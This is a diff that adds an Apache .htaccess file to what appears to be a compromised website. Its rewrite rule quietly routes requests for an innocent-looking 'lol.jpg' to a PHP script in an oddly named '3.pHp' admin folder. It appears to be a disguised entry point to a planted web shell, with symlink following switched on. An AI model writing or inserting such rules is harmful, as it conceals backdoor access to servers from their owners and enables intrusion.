@@ -1,0 +1,3 @@
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule lol.jpg /home/gardoon1/domains/prodevelopers.eu/public_html/academy/bin/admin/3.pHp/img.php [NC]
